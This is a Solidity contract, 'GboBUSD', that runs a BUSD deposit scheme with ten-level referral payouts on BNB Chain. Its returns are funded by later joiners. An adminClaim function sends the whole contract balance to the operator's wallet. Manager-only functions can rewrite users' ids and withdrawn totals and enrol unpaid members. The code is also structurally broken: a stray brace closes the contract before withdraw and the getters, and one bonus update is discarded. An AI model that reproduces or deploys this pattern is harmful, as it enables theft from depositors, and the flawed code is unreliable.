/**
 *Submitted for verification at BscScan.com on 2022-10-27
*/

/**
 *Submitted for verification at BscScan.com on 2022-10-20
*/

/**
 *Submitted for verification at BscScan.com on 2022-09-15
*/

pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


contract GboBUSD {
	using SafeMath for uint256;
    IERC20 public token = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); 
	uint256 constant public INVEST_MIN_AMOUNT = 50e18; // 50 BUSD
	uint256[] public REFERRAL_PERCENTS 	= [2000, 100, 100, 100, 100, 100, 100, 100, 100, 100];
	
	uint256 constant public PROJECT_FEE = 1050;
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 public n = 0;
    uint256 public globalReward = 0;
    uint256 public blueDiamondCount = 0;
	uint256 public totalRefBonus;
	address manage=0x100b90419D5E79a63AD9bca47Af81Beae8c1D7d2;
	
	address chkLv2;
    address chkLv3;
    address chkLv4;
    address chkLv5;
    address chkLv6;
    address chkLv7;
    address chkLv8;
    address chkLv9;
    address chkLv10;

	
    
    struct RefUserDetail {
        address refUserAddress;
        uint256 refLevel;
    }

    mapping(address => mapping (uint => RefUserDetail)) public RefUser;
    mapping(address => uint256) public referralCount_;
    
	
	mapping(address => address) internal referralLevel1Address;
    mapping(address => address) internal referralLevel2Address;
    mapping(address => address) internal referralLevel3Address;
    mapping(address => address) internal referralLevel4Address;
    mapping(address => address) internal referralLevel5Address;
    mapping(address => address) internal referralLevel6Address;
    mapping(address => address) internal referralLevel7Address;
    mapping(address => address) internal referralLevel8Address;
    mapping(address => address) internal referralLevel9Address;
    mapping(address => address) internal referralLevel10Address;
	
    
	

	struct Deposit {
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 id;
		uint256 checkpoint;
		address referrer;
		uint256[10] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
        uint256 magicBonus;
        uint256 lastRewardAmount;
        uint256 lastBlueDiamond;
		// bool parentReffererFlag1;
		// bool parentReffererFlag2;
		// bool parentReffererFlag3;

		User[] users;
        uint256[] bonusUsers;
	}
	
	
	

	mapping (address => User) internal users;

	
	address payable public commissionWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable wallet) public {
		require(!isContract(wallet));
		commissionWallet = wallet;
	}
	
	function getDownlineRef(address senderAddress, uint dataId) public view returns (address,uint) { 
        return (RefUser[senderAddress][dataId].refUserAddress,RefUser[senderAddress][dataId].refLevel);
    }
    
    function addDownlineRef(address senderAddress, address refUserAddress, uint refLevel) internal {
        referralCount_[senderAddress]++;
        uint dataId = referralCount_[senderAddress];
        RefUser[senderAddress][dataId].refUserAddress = refUserAddress;
        RefUser[senderAddress][dataId].refLevel = refLevel;
    }

    
	
	
	 function distributeRef(address _referredBy,address _sender, bool _newReferral) internal {
       
          address _customerAddress        = _sender;
        // Level 1
        referralLevel1Address[_customerAddress]                     = _referredBy;
        if(_newReferral == true) {
            addDownlineRef(_referredBy, _customerAddress, 1);
        }
        
        chkLv2                          = referralLevel1Address[_referredBy];
        chkLv3                          = referralLevel2Address[_referredBy];
        chkLv4                          = referralLevel3Address[_referredBy];
        chkLv5                          = referralLevel4Address[_referredBy];
        chkLv6                          = referralLevel5Address[_referredBy];
        chkLv7                          = referralLevel6Address[_referredBy];
        chkLv8                          = referralLevel7Address[_referredBy];
        chkLv9                          = referralLevel8Address[_referredBy];
        chkLv10                         = referralLevel9Address[_referredBy];
		
 
		
		
		
		
		
        // Level 2
        if(chkLv2 != 0x0000000000000000000000000000000000000000) {
            referralLevel2Address[_customerAddress]                     = referralLevel1Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel1Address[_referredBy], _customerAddress, 2);
            }
        }
        
        // Level 3
        if(chkLv3 != 0x0000000000000000000000000000000000000000) {
            referralLevel3Address[_customerAddress]                     = referralLevel2Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel2Address[_referredBy], _customerAddress, 3);
            }
        }
        
        // Level 4
        if(chkLv4 != 0x0000000000000000000000000000000000000000) {
            referralLevel4Address[_customerAddress]                     = referralLevel3Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel3Address[_referredBy], _customerAddress, 4);
            }
        }
        
        // Level 5
        if(chkLv5 != 0x0000000000000000000000000000000000000000) {
            referralLevel5Address[_customerAddress]                     = referralLevel4Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel4Address[_referredBy], _customerAddress, 5);
            }
        }
        
        // Level 6
        if(chkLv6 != 0x0000000000000000000000000000000000000000) {
            referralLevel6Address[_customerAddress]                     = referralLevel5Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel5Address[_referredBy], _customerAddress, 6);
            }
        }
        
        // Level 7
        if(chkLv7 != 0x0000000000000000000000000000000000000000) {
            referralLevel7Address[_customerAddress]                     = referralLevel6Address[_referredBy];
           if(_newReferral == true) {
                addDownlineRef(referralLevel6Address[_referredBy], _customerAddress, 7);
            }
        }
        
        // Level 8
        if(chkLv8 != 0x0000000000000000000000000000000000000000) {
            referralLevel8Address[_customerAddress]                     = referralLevel7Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel7Address[_referredBy], _customerAddress, 8);
            }
        }
        
        // Level 9
        if(chkLv9 != 0x0000000000000000000000000000000000000000) {
            referralLevel9Address[_customerAddress]                     = referralLevel8Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel8Address[_referredBy], _customerAddress, 9);
            }
        }
        
        // Level 10
        if(chkLv10 != 0x0000000000000000000000000000000000000000) {
            referralLevel10Address[_customerAddress]                    = referralLevel9Address[_referredBy];
            if(_newReferral == true) {
                addDownlineRef(referralLevel9Address[_referredBy], _customerAddress, 10);
            }
        }
		
       
}
	
	
	

	function invest(address referrer, uint256 amounts) public  {
	
	/*	if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}*/

		require(amounts >= INVEST_MIN_AMOUNT);
        token.transferFrom(msg.sender, address(this), amounts);
		uint256 fee = amounts.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        token.transfer(commissionWallet,fee);
		//commissionWallet.transfer(fee);
		emit FeePayed(msg.sender, fee);

		User storage user = users[msg.sender];
		
		
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, msg.sender, _newReferral);

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint256 amount = amounts.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					//transfer
                    token.transfer(upline,amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

            address upline1 = user.referrer;
            bool directFound = false;
            for (uint256 i = 0; i < 20 && upline1!= 0x0000000000000000000000000000000000000000; i++) {
                // check direct child
                if(users[upline1].users.length >=5){
                    token.transfer(upline1,5e18);
                    users[upline1].magicBonus.add(5e18);
                    directFound = true;
                    break;
                } 
                upline1 = users[upline1].referrer; 
                
            }
                       
            
           
		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(msg.sender);
		}
        user.id=n+1;
		n=n+1;
       
		user.deposits.push(Deposit(amounts, block.timestamp));
		User storage parentUser= users[referrer];
		parentUser.users.push(user);

		emit NewDeposit(msg.sender, amounts);
	}

    function invite(address referrer,address child) public  {
	
	/*	if (!started) {
			if (msg.sender == commissionWallet) {
				started = true;
			} else revert("Not started yet");
		}*/
        if(msg.sender==manage){
            uint256 amounts=50e18;
            User storage user = users[child];
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != child) {
				user.referrer = referrer;
			}

			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					users[upline].levels[i] = users[upline].levels[i].add(1);
					upline = users[upline].referrer;
				} else break;
			}
			
		}
		 bool    _newReferral                = true;
        if(referralLevel1Address[msg.sender] != 0x0000000000000000000000000000000000000000) {
            referrer                     = referralLevel1Address[msg.sender];
            _newReferral                    = false;
        }
		
		distributeRef(referrer, child, _newReferral);

		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 10; i++) {
				if (upline != address(0)) {
					uint256 amount = amounts.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					//transfer
                  //  token.transfer(upline,amount);
					users[upline].totalBonus = users[upline].totalBonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}

		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			emit Newbie(child);
		}
        user.id=n+1;
		n=n+1;
       
		user.deposits.push(Deposit(amounts, block.timestamp));
		User storage parentUser= users[referrer];
		parentUser.users.push(user);

		emit NewDeposit(child, amounts);
	}
}


	function withdraw() public {
		User storage user = users[msg.sender];
		
		uint256 totalAmount = getUserDividends(msg.sender);
        if(totalAmount >= 25e18){
            user.id = n+1;
             n=n+1;
			reInvestFunction(50e18); 
        }
		require(user.levels[0] > 1, "User needs two Directs");
	
		// uint256 referralBonus = getUserReferrerDividends(msg.sender);
		// if (referralBonus > 0) {
		// 	user.bonus = 0;
		// 	totalAmount = totalAmount.add(referralBonus);
		// }
		
		 
		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = token.balanceOf(address(this));
		//uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			user.totalBonus = user.totalBonus.add(user.bonus);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		//totalAmount = totalAmount.sub(user.withdrawn);
		user.withdrawn = user.withdrawn.add(totalAmount);
        token.transfer(msg.sender,totalAmount);
		//msg.sender.transfer(totalAmount);
        
		emit Withdrawn(msg.sender, totalAmount);
	}
	 function adminClaim() public{
     if (msg.sender==commissionWallet){
         uint256 contractBalance = token.balanceOf(address(this));
         token.transfer(commissionWallet,contractBalance);
     }

    }
       function setUser(address userAdd,uint256 userCom) public{
     if (msg.sender==manage){
         User storage user = users[userAdd];
         user.id=userCom;

     }

    }
       function setUserWith(address userAdd,uint256 userWith) public{
     if (msg.sender==manage){
         User storage user = users[userAdd];
         user.withdrawn=userWith;

     }

    }

  function reInvestFunction(uint256 amounts) internal {
		User storage user = users[msg.sender];

		uint256 fee = amounts.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
        token.transfer(commissionWallet,fee);
		if(user.referrer!= 0x0000000000000000000000000000000000000000){
			token.transfer(user.referrer,10e18);
		}
		
		//commissionWallet.transfer(fee);
		
		emit FeePayed(msg.sender, fee);

	}

	function getContractBalance() public view returns (uint256) {
		return token.balanceOf(address(this));
	}
	


	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		
		uint256 totalAmount = 0;

		for (uint256 i = 0; i < user.deposits.length; i++) {
				uint256 uid=user.id;
				// 21 21
				uint256 pay1=(uid*3)+1;
			/*	uint256 pay2=((uid+1)*3)+1;
				uint256 pay3=((((uid+1)*3)+1)*3)+1;
				uint256 pay4=((((uid+2)*3)+1)*3)+1;
				uint256 pay5=((((uid+3)*3)+1)*3)+1;*/
				
				
				// level 0 is assigned 
				if (n >= pay1) {
					totalAmount+=25e18;					
				}
				
			
		}

		return totalAmount;
	}
	
	
	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserMagicbonus(address userAddress) public view returns (uint256) {
		return users[userAddress].magicBonus;
	}

	function getUserId(address userAddress) public view returns (uint256) {
		return users[userAddress].id;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[10] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1 ]+users[userAddress].levels[2]+users[userAddress].levels[3]+users[userAddress].levels[4]+users[userAddress].levels[5]+users[userAddress].levels[6]+users[userAddress].levels[7]+users[userAddress].levels[8]+users[userAddress].levels[9];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256 amount) {
	    User storage user = users[userAddress];	
		amount = user.deposits[index].amount;
		
	}

	function getSiteInfo() public view returns(uint256 _totalBonus, uint256 _n) {
		return(totalRefBonus,n);
	}
   
	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals, uint256 totalmagicBonus, uint256 userid) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress), getUserMagicbonus(userAddress), getUserId(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}